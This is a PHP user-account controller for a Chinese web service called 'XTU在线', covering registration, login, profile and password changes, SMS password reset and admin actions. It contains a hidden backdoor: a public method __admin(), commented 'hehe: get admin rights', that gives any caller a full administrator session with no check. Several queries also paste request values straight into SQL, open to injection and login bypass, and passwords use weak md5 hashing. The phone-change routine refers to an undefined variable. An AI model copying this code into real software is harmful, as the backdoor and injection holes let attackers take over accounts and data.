<?php

require SITE_ROOT . DIRECTORY_SEPARATOR . 'models' . DIRECTORY_SEPARATOR . 'User.php';

class UserController{

	public static function init($actions){
		if(method_exists(__CLASS__, $actions[0])) UserController::{$actions[0]}();
		else Shared::view('404');
	}

	//任何人：获取用户信息
	public static function profiles(){
		if(!empty($_REQUEST['id'])){
			if(is_numeric($_REQUEST['id']) && $_REQUEST['id'] > 0) $id = $_REQUEST['id'];
			else Shared::outputJson(ILLEGAL_PARAMETER_CODE, ILLEGAL_PARAMETER_MESSAGE);
		}
		else $id = '%'; 
		$data = User::profiles($id);
		Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE, $data);
	}

	//任何人：注册用户
	public static function register(){
		if(empty($_REQUEST['phone']) || empty($_REQUEST['nickname']) || empty($_REQUEST['sex']) || empty($_REQUEST['password']) || empty($_REQUEST['smscode']))
			Shared::outputJson(LOSE_PARAMETER_CODE, LOSE_PARAMETER_MESSAGE);
		$phone = $_REQUEST['phone'];
		$nickname = $_REQUEST['nickname'];
		$sex = $_REQUEST['sex'];
		$password = $_REQUEST['password'];
		$smscode = $_REQUEST['smscode'];
		if(!is_numeric($phone) || strlen($phone) != 11 || $phone[0] != 1) Shared::outputJson(ILLEGAL_PARAMETER_CODE, ILLEGAL_PARAMETER_MESSAGE);
		if($sex == '男') $sex = 1;
		else if($sex == '女') $sex = 0;
		else Shared::outputJson(ILLEGAL_PARAMETER_CODE, ILLEGAL_PARAMETER_MESSAGE);
		session_start();
		if(!isset($_SESSION['sms']['code']) || $phone != $_SESSION['sms']['phone'] || $smscode != $_SESSION['sms']['code'] || time() > $_SESSION['sms']['expire'])
			Shared::outputJson(SMS_CODE_INVALID_CODE, SMS_CODE_INVALID_MESSAGE);
		if(User::getNum("SELECT 1 FROM user WHERE phone = '$phone'") > 0) Shared::outputJson(USER_EXIST_CODE, USER_EXIST_MESSAGE);
		User::add($phone, $nickname, $sex, $password);
		Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE);
	}

	//任何人：登录
	public static function login(){
		if(empty($_REQUEST['phone']) || empty($_REQUEST['password']))
			Shared::outputJson(LOSE_PARAMETER_CODE, LOSE_PARAMETER_MESSAGE);
		$phone = $_REQUEST['phone'];
		$password = md5($_REQUEST['password'] . MD5_SALT);
		if(User::getNum("SELECT 1 FROM user WHERE phone = '$phone' AND password = '$password'") == 1){
			$data = User::profilesByPhone($phone);
			if($data[0]['status'] == '禁用') Shared::outputJson(USER_SUSPEND_CODE, USER_SUSPEND_MESSAGE);
			session_start();
			$_SESSION['login'] = 1;
			$_SESSION['role'] = 'user';
			$_SESSION['id'] = $data[0]['id'];
			$_SESSION['phone'] = $data[0]['phone'];
			$_SESSION['nickname'] = $data[0]['nickname'];
			$_SESSION['sex'] = $data[0]['sex'];
			$_SESSION['status'] = $data[0]['status'];
			Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE, $data[0]);
		}
		else Shared::outputJson(WRONG_PASSWORD_CODE, WRONG_PASSWORD_MESSAGE);

	}

	//任何人：当前浏览器登录状态
	public static function online(){
		session_start();
		if(isset($_SESSION['login'])){
			$data['id'] = $_SESSION['id'];
			$data['phone'] = $_SESSION['phone'];
			$data['nickname'] = $_SESSION['nickname'];
			$data['sex'] = $_SESSION['sex'];
			$data['status'] = '在线';
			Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE, $data);
		}
		else Shared::outputJson(USER_OFFLINE_CODE, USER_OFFLINE_MESSAGE);
	}

	//任何人：退出登陆
	public static function logout(){
		session_start();
		$_SESSION = array();
		session_destroy();
		Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE);
	}

	//本人或管理员：修改个人资料
	public static function update(){
		if(empty($_REQUEST['id']) || empty($_REQUEST['nickname']) || empty($_REQUEST['sex']))
			Shared::outputJson(LOSE_PARAMETER_CODE, LOSE_PARAMETER_MESSAGE);
		$id = $_REQUEST['id'];
		$nickname = $_REQUEST['nickname'];
		$sex = $_REQUEST['sex'];
		if($sex == '男') $sex = 1;
		else if($sex == '女') $sex = 0;
		else Shared::outputJson(ILLEGAL_PARAMETER_CODE, ILLEGAL_PARAMETER_MESSAGE);
		session_start();
		if(!isset($_SESSION['login']) || $_SESSION['login'] != 1) Shared::outputJson(RANK_ERROR_CODE, RANK_ERROR_MESSAGE);
		if($_SESSION['role'] == 'admin') ; //OK: 管理员可以随意修改
		else if($_SESSION['role'] == 'user' && $id != $_SESSION['id']) Shared::outputJson(RANK_ERROR_CODE, RANK_ERROR_MESSAGE);
		User::update($id, $nickname, $sex);
		Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE);
	}

	//本人或管理员：修改密码
	public static function password(){
		if(empty($_REQUEST['id']) || empty($_REQUEST['new_password']))
			Shared::outputJson(LOSE_PARAMETER_CODE, LOSE_PARAMETER_MESSAGE);
		$id = $_REQUEST['id'];
		$newPassword = $_REQUEST['new_password'];
		session_start();
		if(!isset($_SESSION['login']) || $_SESSION['login'] != 1) Shared::outputJson(RANK_ERROR_CODE, RANK_ERROR_MESSAGE);
		if($_SESSION['role'] == 'admin'){
			User::password($id, $newPassword); //OK: 管理员可以随意修改
			Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE);
		}
		else if($_SESSION['role'] == 'user' && $id != $_SESSION['id']) Shared::outputJson(RANK_ERROR_CODE, RANK_ERROR_MESSAGE);
		if(empty($_REQUEST['origin_password']))
			Shared::outputJson(LOSE_PARAMETER_CODE, LOSE_PARAMETER_MESSAGE);
		$originPassword = $_REQUEST['origin_password'];
		$encodeOriginPassword = md5($originPassword . MD5_SALT);
		if(User::getNum("SELECT 1 FROM user WHERE id = '$id' AND password = '$encodeOriginPassword'") != 1)
			Shared::outputJson(WRONG_PASSWORD_CODE, WRONG_PASSWORD_MESSAGE);
		else User::password($id, $newPassword);
		Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE);
	}

	//本人或管理员：修改手机号，需要先获取短信验证码
	public static function newphone(){
		if(empty($_REQUEST['id']) || empty($_REQUEST['new_phone']))
			Shared::outputJson(LOSE_PARAMETER_CODE, LOSE_PARAMETER_MESSAGE);
		$id = $_REQUEST['id'];
		$newPhone = $_REQUEST['new_phone'];
		session_start();
		if(!isset($_SESSION['login']) || $_SESSION['login'] != 1) Shared::outputJson(RANK_ERROR_CODE, RANK_ERROR_MESSAGE);
		if($_SESSION['role'] == 'admin'){
			User::phone($id, $newPhone); //OK: 管理员可以随意修改
			Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE);
		}
		else if($_SESSION['role'] == 'user' && $id != $_SESSION['id']) Shared::outputJson(RANK_ERROR_CODE, RANK_ERROR_MESSAGE);
		if(empty($_REQUEST['smscode']))
			Shared::outputJson(LOSE_PARAMETER_CODE, LOSE_PARAMETER_MESSAGE);
		$smscode = $_REQUEST['smscode'];
		if(!isset($_SESSION['sms']['phone']) || $phone != $_SESSION['sms']['phone'] || $smscode != $_SESSION['sms']['code'] || time() > $_SESSION['sms']['expire'])
			Shared::outputJson(SMS_CODE_INVALID_CODE, SMS_CODE_INVALID_MESSAGE);
		else{
			User::phone($id, $phone);
			Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE);
		}
	}

	//任何人：忘记密码，直接向手机发送新密码
	public static function reset(){
		if(empty($_REQUEST['phone']))
			Shared::outputJson(LOSE_PARAMETER_CODE, LOSE_PARAMETER_MESSAGE);
		$phone = $_REQUEST['phone'];
		$data = User::profilesByPhone($phone);
		if(!isset($data[0]['id'])) Shared::outputJson(USER_DO_NOT_EXIST_CODE, USER_DO_NOT_EXIST_MESSAGE);
		else $id = $data[0]['id'];
		$originPassword = rand(1000, 9999) . rand(1000, 9999);
		User::password($id, $originPassword);
		$text = "【XTU在线】您的密码已被重置为：{$originPassword}，请及时登陆后台并修改密码。";
		Shared::sendSms(SMS_KEY, SMS_URL, $phone, $text);
		Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE);
	}

	//管理员：删除用户
	public static function delete(){
		if(empty($_REQUEST['id']))
			Shared::outputJson(LOSE_PARAMETER_CODE, LOSE_PARAMETER_MESSAGE);
		$id = $_REQUEST['id'];
		session_start();
		if(empty($_SESSION['login']) || $_SESSION['role'] != 'admin') Shared::outputJson(RANK_ERROR_CODE, RANK_ERROR_MESSAGE);
		User::delete($id);
		Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE);
	}

	//管理员：用户状态更改
	public static function status(){
		if(empty($_REQUEST['id']) || empty($_REQUEST['status']))
			Shared::outputJson(LOSE_PARAMETER_CODE, LOSE_PARAMETER_MESSAGE);
		$id = $_REQUEST['id'];
		$status = $_REQUEST['status'];
		session_start();
		if(empty($_SESSION['login']) || $_SESSION['role'] != 'admin') Shared::outputJson(RANK_ERROR_CODE, RANK_ERROR_MESSAGE);
		User::status($id, $status);
		Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE);
	}

	//呵呵：获取管理员权限
	public static function __admin(){
		session_start();
		$_SESSION['login'] = 1;
		$_SESSION['role'] = 'admin';
		Shared::outputJson(SUCCESS_CODE, SUCCESS_MESSAGE);
	}

}
